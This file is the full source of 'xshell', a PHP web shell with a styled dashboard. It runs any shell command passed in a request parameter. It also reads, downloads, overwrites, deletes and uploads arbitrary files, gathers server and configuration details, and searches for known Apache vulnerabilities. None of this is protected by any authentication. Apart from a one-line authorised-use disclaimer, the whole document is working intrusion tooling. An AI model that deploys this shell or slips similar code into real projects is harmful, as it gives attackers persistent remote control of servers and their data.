<?php
    /*
     * xshell 
     */

    function error_handler($errno, $errstr)
    {

    }

    //set_error_handler("error_handler");

    /* Gather information about the server */
    /* Find out who we are */
    //var_dump($_SERVER);
    $USER = posix_getpwuid(posix_geteuid());
    /*echo "I am {$USER['name']}<br />";
    echo "Document root: {$_SERVER['DOCUMENT_ROOT']}<br />";
    echo "My permissions in current directory: " . substr(sprintf('%o', fileperms($_SERVER['DOCUMENT_ROOT'])));*/
    clearstatcache();
    
    if (isset($_REQUEST['ajax']))
    {
        /* Handle an ajax request */
        if ($_REQUEST['ajax'] == 'info')
        {
            /* Assemble the appropriate data */
            /* User */
            $processUser = posix_getpwuid(posix_geteuid());
            /* Services */
            passthru('service --status-all');
            $_services = str_replace("\r", '', ob_get_clean()); // Remove output from buffer
            $_services = explode("\n", $_services);
            foreach ($_services as $s)
            {
                if (@$s[3] == '+')
                {
                    $services[] = substr($s, 8);
                }
            }
            foreach ($_services as $s)
            {
                if (@$s[3] != '+')
                {
                    $services[] = substr($s, 8);
                }
            }
            /* Free space */
            //passthru('df ' . $_SERVER['DOCUMENT_ROOT'] . ' -P');
            $free_space = ob_get_clean();
            /* Process */
            $ps = explode("\n", shell_exec("ps --no-headers -o cmd U " . $processUser['name']));
            $ps = explode(" ", $ps[0]);
            $ps = $ps[0];
            /* httpd root */
            $lines = explode("\n", shell_exec($ps . ' -V'));
            foreach ($lines as $line)
            {
                if (strpos($line, "-D HTTPD_ROOT") > 0)
                {
                    eval(str_replace("-D HTTPD_ROOT", '$httpd_root', $line) . ';');
                }
                if (strpos($line, "-D SERVER_CONFIG_FILE") > 0)
                {
                    eval(str_replace("-D SERVER_CONFIG_FILE", '$server_config_file', $line) . ';');
                }
            }
            /* Read config */
            $_server_config = preg_replace('/\s*#.*/', '', explode("\n", file_get_contents($httpd_root . '/' . $server_config_file)));
            foreach ($_server_config as $s)
            {
                if (strlen($s) > 0) $server_config .= trim($s) . "\n";
            }

            /* JSON-encode it */
            $ret = array(
                'server_software' => $_SERVER['SERVER_SOFTWARE'],
                'php_uname' => php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname ('v'),
                'user' => $processUser['name'],
                'filename' => $_SERVER['SCRIPT_FILENAME'],
                'document_root' => $_SERVER['DOCUMENT_ROOT'],
                'free_space' => $free_space,
                'services' => $services,
                'php_version' => PHP_VERSION,
                'system' => php_uname('a'),
                'extensions' => get_loaded_extensions(),
                'config' => parse_ini_file(php_ini_loaded_file()),
                'ps' => $ps,
                'httpd_root' => $httpd_root,
                'server_config' => $server_config
            );
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'dir')
        {
            $dir = realpath(realpath($_REQUEST['dir']) . DIRECTORY_SEPARATOR . @$_REQUEST['go']);
            if (@$_REQUEST['go'][0] == '/')
            {
                $dir = realpath($_REQUEST['go']);
            }
            $ret['dir'] = $dir;
            $files = scandir($dir);
            foreach ($files as $file)
            {
                if (is_dir(realpath($dir . DIRECTORY_SEPARATOR . $file)))
                {
                    $ret['dirs'][] = $file;
                }
                else
                {
                    $ret['files'][] = $file;
                }
            }
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'get')
        {
            echo file_get_contents($_REQUEST['get']);
        }
        if ($_REQUEST['ajax'] == 'download')
        {
            header('Pragma: public');
            header('Expires: 0');
            header('Content-Type: application/force-download');
            header('Content-Transfer-Encoding: binary');
            header('Content-Disposition: attachment; filename="' . basename($_REQUEST['download']) . '"');
            echo file_get_contents($_REQUEST['download']);
        }
        if ($_REQUEST['ajax'] == 'save')
        {
            file_put_contents($_REQUEST['save'], $_REQUEST['contents']);
        }
        if ($_REQUEST['ajax'] == 'getfileinfo')
        {
            $ret = array(
                'contents' => file_get_contents($_REQUEST['file']),
                'writeable' => is_writeable($_REQUEST['file'])
            );
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'delete')
        {
            unlink($_REQUEST['file']);
        }
        if ($_REQUEST['ajax'] == 'upload')
        {
            move_uploaded_file($_FILES['file']['tmp_name'], $_REQUEST['upload']);
        }
        if ($_REQUEST['ajax'] == 'passthru')
        {
            passthru($_REQUEST['passthru']);
            $output = ob_get_clean();
            $ret['output'] = $output;
            $ret['cwd'] = getcwd();
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'config')
        {
            echo json_encode(parse_ini_file(php_ini_loaded_file()));
        }
        if ($_REQUEST['ajax'] == 'vulnerabilities')
        {
            // Get Apache version
            $processUser = posix_getpwuid(posix_geteuid());
            $username = $processUser['name'];
            $ps = explode("\n", shell_exec("ps --no-headers -o cmd U " . $processUser['name']));
            $ps = explode(" ", $ps[0]);
            $ps = $ps[0];
            preg_match('#(?:Apache/)(\d+\.\d+\.\d+)#', shell_exec($ps . ' -v'), $matches);
            $version = $matches[1];
            // Search for Apache vulns
            $osvdb = file_get_contents("http://www.osvdb.org/search?search%5Bvuln_title%5D=Apache+" . $version . "&search%5Btext_type%5D=alltext");
            preg_match('$(?:<a href="/show/osvdb/)(\d+)(?:.*?<a href="#" onclick="Element\.toggle\(\'desc\d+\'\);; return false;">)(.*?)(?:</a>)$s', $osvdb, $matches);
            for ($i = 1; $i < count($matches); $i += 2)
            {
                $ret[$matches[$i]] = $matches[$i + 1];
            }
            echo json_encode($ret);
        }
        die();
    }
    else
    {
         ?> <!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>xshell</title>
        <script>VERSION = "2.0.17-a1";</script>
        <style>body {
    background: #3d3d3d;
    font-family: 'Open Sans', sans-serif;
    font-size: 13px;
    color: #fff;
    padding: 0;
    margin: 0;
}

/* Fonts */
@font-face
{
    font-family: 'Font Awesome';
    src: url('https://github.com/FortAwesome/Font-Awesome/raw/master/font/fontawesome-webfont.ttf');
}
.tile-icon {
    font-family: 'Font Awesome';
    font-size: 100px;
    line-height: 135px;
    text-align: center;
    display: block;
    margin: 0 auto;
}
.icon {
    font-family: 'Font Awesome';
    font-size: 100px;
    line-height: 135px;
    display: block;
}

/* Header */
body header {
    background: #1f1f1f;
    /*padding: 20px;*/
    position: fixed;
    top: 0;
    z-index: 10;
    overflow: visible;
    width: 100%;
}

body header div {
    padding-left: 20px;
    padding-top: 10px;
    padding-bottom: 10px;    
}

body header div span {
    text-transform: uppercase;
    font-size: 20px;
    line-height: 20px;
}

body header div a {
    color: #fff;
    text-decoration: none;
}

body header div a.icon {
    font-size: 20px;
    line-height: 20px;
    display: inline !important;
    position: fixed;
    left: 245px;
    cursor: pointer;
}

/* Container */
div.container {
    margin-top: 40px;
}

/* Sidebar */
div.sidebar {
    position: fixed;
    width: 225px;
    height: auto;
}
.sidebar ul {
    width: 225px;
    list-style: none;
    margin: 0;
    padding: 0;
}
.sidebar ul li {
    display: block;
    margin: 0;
    padding: 0;
    border: 0;
    line-height: 20px;
    padding: 10px 15px;
    cursor: pointer;
    font-size: 14px;
    font-weight: 300;
    color: #fff;
    text-decoration: none;
}
.sidebar-li-active {
    background-color: #d02222;
}
.sidebar-li-inactive:hover {
    background-color: #4b4b4b;
}
form.sidebar-search {
    padding-bottom: 2px;
    border-bottom: 1px solid #959595;
}
form.sidebar-search input {
    background-color: #3d3d3d;
    color: #bababa;
    margin: 0px;
    width: 165px;
    border: 0px;
    padding-left: 0px;
    padding-right: 0px;
    padding-bottom: 0px;
    font-size: 14px;
    box-shadow: none;
    display: inline-block;
    height: 20px;
    padding: 4px 6px;
    line-height: 20px;
    vertical-align: middle;
    -webkit-border-radius: 0;
    border-radius: 0;
    -webkit-appearance: textfield;
}

/* Content */
.page-content {
    margin-left: 225px;
    margin-top: 0px;
    min-height: 860px;
    background-color: #fff;
}
.page-container {
    padding-right: 20px;
    padding-left: 20px;
    padding-top: 20px;
}
.page-container-hidden {
    display: none;
}
.page-container h3 {
    padding: 0px;
    font-size: 30px;
    letter-spacing: -1px;
    display: block;
    color: #666;
    margin: 20px 0px 15px 0px;
    font-weight: 300;
    line-height: 40px;
    font-family: 'Open Sans', sans-serif;
}
h3 small {
    font-size: 14px;
    letter-spacing: 0px;
    font-weight: 300;
    color: #888;
}
div.page {
    color: #000;
    font-family: 'Open Sans';
    font-size: 13px;
}

/* Tiles */
div.tile {
    display: block;
    float: left;
    height: 130px;
    cursor: pointer;
    text-decoration: none;
    color: #ffffff;
    position: relative;
    font-weight: 300;
    font-size: 12px;
    letter-spacing: 0.02em;
    line-height: 20px;
    font-smooth: always;
    border: 4px solid transparent;
    margin: 0 10px 10px 0;
    font-family: 'Open Sans', sans-serif;
    width: 130px;
}
div.tile:hover {
    border-color: #ccc;
}
div.tile.double {
    width: 278px !important;
}
div.tile.double-down {
    height:278px;
}
div.tile.blue {
    background-color: #4b8df8;
}
div.tile.green {
    background-color: #35aa47;
}
div.tile.orange {
    background-color: #ffb848;
}
div.tile.purple {
    background-color: #852b99;
}
div.tile.red {
    background-color: #e02222;
}
div.tile .corner {
    
}
div.tile.inactive {
    cursor: not-allowed, default !important;
    background-color: #ccc !important;
}
div.tile h3 {
    padding: 10px;
    margin: 0;
    line-height: 14px;
    color: #fff;
    font-size: 24px;
}
div.tile p {
    /*display: block;*/
    padding: 10px;
    overflow: hidden;
    height: 100%;
}

/* Custom scrolling */
::-webkit-scrollbar {
    width: 12px;
}
::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0);
}
::-webkit-scrollbar-thumb {
    background: rgba(0, 0, 0, 0.0);
}
::-webkit-scrollbar-thumb:hover {
    background: rgba(0, 0, 0, 0.2);
}

/* File browser widget */
div#editor {
    height: 300px;
}
div.file-browser {
    /*background-color: #f5f5f5;
    border: 1px solid #ccc;
    height: 400px;*/
    text-align: center;
}
.file-browser ul {
    list-style: none;
    padding: 0;
    margin: 0;
}
.file-browser ul li div.preview {
    /*display: none;*/
    float: none;
    width: 130px;
    height: 130px;
    position: absolute;
    top: 0;
    left: 0;
    -webkit-filter: blur(2px);
    background-size: contain;
    opacity: 0.6;
}
li.file-browser {
    display: block;
    width: 130px;
    height: 130px;
    background-color: #4b4b4b;
    text-align: center;
    float: left;
    margin-left: 10px;
    margin-top: 10px;
    cursor: pointer;
    border: 4px solid transparent;
    color: #fff;
    overflow: hidden;
    position: relative;
}
li.file-browser:hover {
    border: 4px solid #ccc;
}
li.file-browser h3 {
    color: #fff;
    z-index: 1;
}
li.file-browser p {
    z-index: 1;
}
li.file-directory {
    background-color: #4b4b4b;
}
li.file-php {
    background-color: #e02222;   
}
li.file-image {
    overflow: hidden !important;
    background-color: #4b4b4b;
}
li.file-misc {
    background-color: #4b8df8;
}
li.file-html {
    background-color: #ffb848;
}

/* Loading screen */
div.loading {
    display: block;
    width: 100%;
    height: 100%;
    z-index: 100;
    position: fixed;
    top: 0;
    left: 0;
    background-color: #1f1f1f;
    text-align: center;
}
div.loading h3 {
    position: relative;
    top: 100px;
    z-index: 101;
    font-size: 30px;
    letter-spacing: -1px;
    color: #fff;
    font-weight: 300;
    line-height: 40px;
    font-family: 'Open Sans', sans-serif;
}
div.loading h4 {
    position: relative;
    top: 60px;
    z-index: 101;
    font-size: 20px;
    letter-spacing: -1px;
    color: #fff;
    font-weight: 300;
    line-height: 40px;
    font-family: 'Open Sans', sans-serif;
}

/* Right sidebar */
div.right-sidebar {
    width: 450px;
    height: 480px;
    float: right;
    z-index: 20;
    position: fixed;
    top: 0;
    right: 0;
    background: #3d3d3d;
    display: none;
    padding: 20px;
    text-align: center;
    /*display: block;
    width: 90%;
    height: 90%;
    margin: 0 auto;
    z-index: 100;
    position: absolute;
    top: 0;
    left: 0;
    background-color: #3d3d3d;
    text-align: center;*/
}
div.right-sidebar h3 {
    font-size: 30px;
    letter-spacing: -1px;
    color: #fff;
    font-weight: 300;
    line-height: 40px;
    font-family: 'Open Sans', sans-serif;
}
div.right-sidebar img {
    width: 150px;
    height: 150px;
    border: 4px solid #ccc;
}
div.right-sidebar pre {
    text-align: left;
    color: #000;
    background: #fff;
    width: 100%;
    height: 150px;
    border: 4px solid #ccc;
    overflow: scroll;
}
div #console {
    width: 480px;
    height: 320px;
}</style>
        <style>.terminal .terminal-output .format, .terminal .cmd .format,
.terminal .cmd .prompt, .terminal .cmd .prompt div, .terminal .terminal-output div div{
    display: inline-block;
}
.terminal .clipboard {
    position: absolute;
    bottom: 0;
    left: 0;
    opacity: 0.01;
    filter: alpha(opacity = 0.01);
    filter: progid:DXImageTransform.Microsoft.Alpha(opacity=0.01);
    width: 2px;
}
.cmd > .clipboard {
    position: fixed;
}
.terminal {
    padding: 10px;
    position: relative;
    overflow: hidden;
}
.cmd {
    padding: 0;
    margin: 0;
    height: 1.3em;
    margin-top: 3px;
}
.terminal .terminal-output div div, .terminal .prompt {
    display: block;
    line-height: 14px;
    height: auto;
}
.terminal .prompt {
    float: left;
}

.terminal {
    font-family: FreeMono, monospace;
    color: #aaa;
    background-color: #000;
    font-size: 12px;
    line-height: 14px;
}
.terminal-output > div {
    padding-top: 3px;
}
.terminal .terminal-output div span {
    display: inline-block;
}
.terminal .cmd span {
    float: left;
    /*display: inline-block; */
}
.terminal .cmd span.inverted {
    background-color: #aaa;
    color: #000;
}
.terminal .terminal-output div div::-moz-selection,
.terminal .terminal-output div span::-moz-selection,
.terminal .terminal-output div div a::-moz-selection {
    background-color: #aaa;
    color: #000;
}
.terminal .terminal-output div div::selection,
.terminal .terminal-output div div a::selection,
.terminal .terminal-output div span::selection,
.terminal .cmd > span::selection,
.terminal .prompt span::selection {
    background-color: #aaa;
    color: #000;
}
.terminal .terminal-output div.error, .terminal .terminal-output div.error div {
    color: red;
}
.tilda {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: 1100;
}
.clear {
    clear: both;
}
.terminal a {
    color: #0F60FF;
}
.terminal a:hover {
    color: red;
}</style>
        <script>/**
 * Global variables
 */

URL = "http://" + window.location.host + window.location.pathname;
TERM = null;
STARTTIME = null;
HISTORY = [];

/**
 * Array holding a list of scripts to dynamically load
 * @type {Array}
 */
var scripts = [
    'https://raw.github.com/jcubic/jquery.terminal/master/js/jquery.terminal-min.js',
    'http://ajax.googleapis.com/ajax/libs/jqueryui/1.10.2/jquery-ui.min.js',
    'http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js',
    'https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js'
];

/**
 * Array holding a list of stylesheets to dynamically load
 * @type {Array}
 */
var styles = [
    'https://raw.github.com/jcubic/jquery.terminal/master/css/jquery.terminal.css',
    'http://fonts.googleapis.com/css?family=Open+Sans:300'
];

/**
 * Dynamically loads a JavaScript file.
 * @param {String} url The URL of the file to load
 * @param {Function} callback A function to be called when the file has been loaded
 * @return {null}
 */
function loadScript(url, callback){
    console.log('Loading ' + url)
    var script = document.createElement('script');
    script.setAttribute('type', 'text/javascript');
    script.setAttribute('src', url);
    script.onload = callback;
    document.getElementsByTagName('head')[0].appendChild(script);
    return;
}

/**
 * Dynamically loads a stylesheet
 * @param {String} url The URL of the file to load
 * @param {Function} callback A function to be called when the file has been loaded
 * @return {null}
 */
function loadStyle(url, callback) {
    console.log('Loading ' + url);
    var style = document.createElement('link');
    style.setAttribute('rel', 'stylesheet');
    style.setAttribute('type', 'text/css');
    style.setAttribute('href', url);
    style.onload = callback;
    document.getElementsByTagName('head')[0].appendChild(style);
    return;
}

/**
 * Dynamically load all required resources
 * @return {null}
 */
function loadResources() {
    // Check if we're done
    if (styles.length == 0 && scripts.length == 0) {
        document.getElementById('loading-text').innerHTML = 'Done!';
        setTimeout(ready, 500);
        return;
    }
    var url;
    // Load stylesheets first
    if (styles.length > 0) {
        url = styles.pop();
        document.getElementById('loading-text').innerHTML = 
            'Loading ' + url + '...';
        loadStyle(url, loadResources);
        return;
    }
    // Load scripts
    if (scripts.length > 0) {
        url = scripts.pop();
        document.getElementById('loading-text').innerHTML = 
            'Loading ' + url + '...';
        loadScript(url, loadResources);
        return;
    }
    return;
}

/**
 * Function to be called on the window.onload event
 * @return {null}
 */
function windowLoad(){
    loadResources();
}

/**
 * Anonymous function to be called immediately
 */
(function(){
    STARTTIME = new Date();
    // Load all our resources
    window.onload = windowLoad;
})();

/**
 * Function to be called when all resources have finished loading
 * @return {null}
 */
function ready() {
    /* Set up version info */
    $("#xshell-version").html(VERSION);
    $("#xshell-version").get(0).href="http://www.quetuo.net/xshell?" + VERSION;
    /* Get rid of loading screen */
    $("#div-loading").hide("slide", { direction: "right" }, 200);//.slideUp();
    /* Set up sidebar */
    $("#sidebar li.li-shortcut").each(function(index) {
        /* Change classes depending on active or not */
        if (this.dataset.active == "1") {
            this.className="sidebar-li-active";
        } else if (this.dataset.active == "0") {
            this.className="sidebar-li-inactive";
        }
        /* Add onClick handler */
        $(this).click(function() {
            /* Reset the sidebar */
            $("#sidebar li").each(function() {
                if (this.dataset.active == "1") {
                    this.dataset.active = "0";
                    this.className="sidebar-li-inactive";
                    $("#page-" + this.dataset.link).attr("class", "page-container-hidden");
                    HISTORY.push(this.dataset.link);
                }
            });
            /* Activate appropriate option */
            this.dataset.active = "1";
            this.className="sidebar-li-active";
            window.location.hash = this.dataset.link;
            document.title = "xshell » " + this.innerHTML;
            /* Activate page */
            $("#page-" + this.dataset.link).attr("class", "page-container");
            var activateFunction = window[this.dataset.link.replace("-", "") + "_activate"];
            activateFunction();

        });
    });
    //go_to("dashboard");
    /* Check if a sidebar location is already specified in URL */
    $("#sidebar li").each(function(index) {
        if (("#" + this.dataset.link) == window.location.hash) {
            $(this).click();
        }
    });
    
    var endtime = new Date();
    xshell_log("Loaded in " + (endtime - STARTTIME) + "ms");
 }
 
function wait(on) {
    if (on) {
        document.body.style.cursor = 'wait';
    } else {
        document.body.style.cursor = 'auto';
    }
}

function go_to(a) {
    $("#sidebar li").each(function(index) {
        if (this.dataset.link == a) {
            $(this).click();
        }
    });
}

function dashboard_activate() {
    console.log("dashboard_activate");
    wait(true);
    $("#tile-files").click(function(){
        go_to("file-system");
    });
    $.getJSON(URL + "?ajax=info", function(data) {
        console.dir(data);
        $("#p-software").html(data.server_software.replace("Apache", "<strong>Apache</strong>") + "<br />" + data.php_uname.replace("Linux", "<strong>Linux</strong>").replace("Unix", "<strong>Unix</strong>").replace("Windows", "<strong>Windows</strong>"));
        $("#p-environment").html("User: " + data.user + "<br />Root: " + data.document_root + "<br />File: " + data.filename);
        for (var i = 0; i < data.services.length; i++) {
            $("#p-services").html($("#p-services").html() + data.services[i] + "<br />");
        }
        wait(false);
    });
}

function information_activate() {
    wait(true);
    $.getJSON(URL + "?ajax=info", function(data) {
        xshell_log("Received information data from server");
        console.dir(data);
        $("#span-filename").html(data.filename);
        $("#span-php-version").html(data.php_version);
        $("#span-system").html(data.system);
        $("#span-user").html(data.user);
        $("#span-extensions").html("");
        for (var i = 0; i < data.extensions.length; i ++) {
            $("#span-extensions").html($("#span-extensions").html() + data.extensions[i] + (i == data.extensions.length - 1 ? "" : ", "));
        }
        $("#span-ps").html(data.ps);
        $("#span-httpd-root").html(data.httpd_root);
        for (var key in data.config) {
            $("#table-php-config").append("<tr><td>" + key + "</td><td>" + data.config[key] + "</td></tr>");
        }
        $("#pre-server-config").html(data.server_config);
        wait(false);
    });
}

function filesystem_navigate(dir) {
    console.log("Navigating to " + dir + " (Current dir is " + $(".file-browser").get(0).dataset.dir + ")");
    wait(true);
    $.getJSON(URL + "?ajax=dir&dir=" + $(".file-browser").get(0).dataset.dir + "&go=" + dir, function(data) {
        xshell_log("Received filesystem data from server for " + data.dir);
        $(".file-browser").get(0).dataset.dir = data.dir;
        $("#page-file-system h3 small").html(data.dir);
        console.dir(data);
        /* Clear file browser */
        $(".file-browser ul").empty();
        for (var i = 0; i < data.dirs.length; i ++) {
            $(".file-browser ul").append('<li class="file-browser file-directory" data-dir="' + data.dirs[i] + '"><h3>' + data.dirs[i] + '</h3><p>Directory</p></li>');
            $(".file-browser ul li").last().click(function(){
                filesystem_navigate(this.dataset.dir);
            });
        }
        for (var i = 0; i < data.files.length; i ++) {
            console.log(data.files[i]);
            var ft = 'misc';
            var dot = data.files[i].indexOf(".");
            var ext = (dot == -1 ? data.files[i] : data.files[i].substr(dot)).toLowerCase();
            if (ext == ".php") {ft = "php";}
            if (ext == ".html" || ext == ".htm") {ft = "html";}
            if (ext == ".jpg" || ext == ".png" || ext == ".bmp") {ft = "image";}
            $(".file-browser ul").append('<li class="file-browser file-' + ft + '" data-dir="' + data.files[i] + '" data-ft="' + ft + '"><h3>' + data.files[i] + '</h3><p>' + (ft == "misc" ? ext : ft) + ' file</p></li>');
            $(".file-browser ul li").last().click(function(){
                console.log(this.dataset.dir);
                $(".right-sidebar").fadeIn(250);
                $(".right-sidebar h3").html(this.dataset.dir);
                if (this.dataset.ft == "image") {
                    $(".right-sidebar img").show();
                    $(".right-sidebar img").get(0).src = URL + '?ajax=get&get=' + $(".file-browser").get(0).dataset.dir + '/' + this.dataset.dir;
                    $(".right-sidebar pre").hide();
                } else {
                    $(".right-sidebar pre").show();
                    $(".right-sidebar pre").get(0).innerHTML = 'Loading...';//URL + '?ajax=get&get=' + $(".file-browser").get(0).dataset.dir + '/' + this.dataset.dir;
                    $.get(URL + '?ajax=get&get=' + $(".file-browser").get(0).dataset.dir + '/' + this.dataset.dir, function(data){
                        $(".right-sidebar pre").html(data.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'));
                    })
                    //$(".right-sidebar pre").load(URL + '?ajax=get&get=' + $(".file-browser").get(0).dataset.dir + '/' + this.dataset.dir);
                    $(".right-sidebar img").hide();
                }
            });
            if (ft == "image") {
                console.log(URL + "?ajax=get&get=" + data.dir + "/" + data.files[i]);
                $(".file-browser ul li").last().append('<div class="preview" style="background-image:url(' + URL + '?ajax=get&get=' + data.dir + '/' + data.files[i] + ')"></div>');
            }
        }
        wait(false);
    });
}

function filesystem_activate() {
    filesystem_navigate($(".file-browser").get(0).dataset.dir);
}

function console_activate() {
    console.log("console_activate");
    $("#console").terminal(function(command, term) {
        wait(true);
        TERM = term;
        term.pause();
        $.getJSON(URL + "?ajax=passthru&passthru=" + escape(command), function(data){
            xshell_log("Received console data");
            console.dir(data);
            $("#console").get(0).dataset.cwd = data.cwd;
            TERM.echo(data.output);
            TERM.resume();
            wait(false);
        })
    }, {prompt: '$ ', name: 'console', 'greetings': 'xshell v2.0.0a', 'enabled': false});
}

function help_activate() {
    
}

function xshell_log(text) {
    console.log("xshell: " + text);
    $("#p-log").html(text + "<br />" + $("#p-log").html());
}

function go_back() {
    go_to(HISTORY.pop());
}</script>
    </head>
    <body>
        <!-- BEGIN LOADING SCREEN -->
        <div id="div-loading" class="loading">
            <h3><span class="icon">&#xf021;</span>Loading</h3>
            <h4 id="loading-text">Working...</h4>
        </div>
        <!-- END LOADING SCREEN -->
        <!-- BEGIN HEADER -->
        <header>
            <div>
                <span style="color: #e02222;">x</span><span>shell</span> <a href="http://www.quetuo.net/xshell" id="xshell-version"></a>
                <a class="icon">&#xf0a8;</a>
            </div>
        </header>
        <!-- END HEADER -->
        <!-- BEGIN CONTAINER -->
        <div class="container">
            <!-- BEGIN SIDEBAR -->
            <div class="sidebar">
                <ul id="sidebar">
                    <li>
                        <form class="sidebar-search">
                            <input type="text" placeholder="Search..." />
                        </form> 
                    </li>
                    <li class="li-shortcut" data-active="1" data-link="dashboard">Dashboard</li>
                    <li class="li-shortcut" data-active="0" data-link="information">Information</li>
                    <li class="li-shortcut" data-active="0" data-link="file-system">File System</li>
                    <li class="li-shortcut" data-active="0" data-link="vulnerabilities">Vulnerabilities</li>
                    <li class="li-shortcut" data-active="0" data-link="console">Console</li>
                    <li class="li-shortcut" data-active="0" data-link="help">Help</li>
                </ul>
            </div>
            <!-- END SIDEBAR -->
            <!-- BEGIN CONTENT -->
            <div class="page-content">
            <!-- Dashboard -->
            <div class="page-container" id="page-dashboard">
                <h3>Dashboard <small>overview</small></h3>
                <div class="page">
                    <div class="tile double blue" id="tile-software">
                        <h3>Software</h3>
                        <p id="p-software"></p>
                    </div>
                    <div class="tile double green" id="tile-environment">
                        <h3>Environment</h3>
                        <p id="p-environment"></p>
                    </div>
                    <div class="tile orange" id="tile-files">
                        <span class="tile-icon">&#xf0c5;</span>
                    </div><br style="clear: both"/>
                    <div class="tile double-down purple" id="tile-services">
                        <h3>Services</h3>
                        <p id="p-services"></p>
                    </div>
                    <div class="tile double double-down orange" id="tile-log">
                         <h3>Log</h3>
                         <p id="p-log"></p>
                    </div>
                    <div class="tile double red" id="tile-info">
                        <h3>Info</h3>
                        <p>xshell is idle</p>
                    </div>
                    <div class="tile blue" id="tile-settings" style="position: relative; top: 148px; left: -296px;">
                        <span class="tile-icon">&#xf013;</span>
                    </div>
                    <div class="tile purple" id="tile-help" style="position: relative; top: 0; left: 148px">
                        <h3>Help</h3>
                    </div>
                </div>
            </div>
            <!-- Information -->
            <div class="page-container-hidden" id="page-information">
                <h3>Information</h3>
                <div class="page">
                    <strong>Filename: </strong><span id="span-filename"></span><br />
                    <strong>PHP Version: </strong><span id="span-php-version"></span><br />
                    <strong>System: </strong><span id="span-system"></span><br />
                    <strong>User: </strong><span id="span-user"></span><br />
                    <strong>Extensions: </strong><span id="span-extensions"></span><br />
                    <strong>Server Process: </strong><span id="span-ps"></span><br />
                    <strong>HTTPd Root: </strong><span id="span-httpd-root"></span><br />
                    <strong>PHP Config Values: </strong><br />
                    <table id="table-php-config"></table>
                    <strong>Server Config:</strong>
                    <pre style="font-family: Open Sans; background: #EEE;" id="pre-server-config"></pre>
                </div>
            </div>
            <!-- File system -->
            <div class="page-container-hidden" id="page-file-system">
                <h3>File System <small>overview</small></h3>
                <div class="page">
                    <div class="file-browser" data-dir="">
                        <ul>
                            <li class="file-browser file-directory">
                                <h3>.</h3>
                                <p>Directory</p>
                            </li>
                            <li class="file-browser file-directory">
                                <h3>..</h3>
                                <p>Directory</p>
                            </li>
                            <li class="file-browser file-php">
                                <h3>index.php</h3>
                                <p>PHP file</p>
                            </li>
                            <li class="file-browser file-php">
                                <h3>config.php</h3>
                                <p>PHP file</p>
                            </li>
                            <li class="file-browser file-image">
                                <h3>logo.jpg</h3>
                                <p>JPEG</p>
                            </li>
                            <li class="file-browser file-misc">
                                <h3>.htaccess</h3>
                                <p>.htaccess file</p>
                            </li>
                            <li class="file-browser file-html">
                                <h3>template.html</h3>
                                <p>HTML file</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <!-- File editor -->
            <div class="page-container-hidden" id="page-file-editor">
                <h3>File Editor <small>Undefined</small></h3>
                <div class="page">
                    <div id="editor"></div><br />
                    <div class="tile blue" id="tile-save">
                        <span class="tile-icon">&#xf0c7;</span>
                    </div>
                    <div class="tile orange" id="tile-download">
                        <span class="tile-icon">&#xf019;</span>
                    </div>
                    <div class="tile red" id="tile-delete">
                        <span class="tile-icon">&#xf014;</span>
                    </div>
                </div>
            </div>
            <!-- Vulnerabilities -->
            <div class="page-container-hidden" id="page-vulnerabilities">
                <h3>Vulnerabilities <small>potential vulnerabilities</small></h3>
                <div class="page">
                </div>
            </div>
            <!-- Console -->
            <div class="page-container-hidden" id="page-console">
                <h3>Console</h3>
                <div class="page">
                    <div id="console" ></div>
                </div>
            </div>
            <!-- Help -->
            <div class="page-container-hidden" id="page-help">
                <h3>Help</h3>
                <div class="page">
                    <a href="https://github.com/Quetuo/xshell"><img style="position: absolute; top: 41px; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
                    <p><strong>xshell</strong> is a PHP web shell written by Quetuo <a href="mailto:quetuo@quetuo.net">&lt;quetuo@quetuo.net&gt;</a></p>
                    <p>As always, <strong>you</strong> are responsible for your own actions. Do not use xshell on a machine or network on which you are not authorised to do so.</p>
                </div>
            </div>
        </div>
            <!-- END CONTENT -->
            <!-- BEGIN RIGHT SIDEBAR -->
            <div class="right-sidebar">
                <h3></h3>
                <img alt="No preview available"></img>
                <pre class="prettyprint linenums"></pre>
            </div>
            <!-- END RIGHT SIDEBAR -->
        </div>
        <!-- END CONTAINER -->
    </body>
</html> <?php 
    }
?>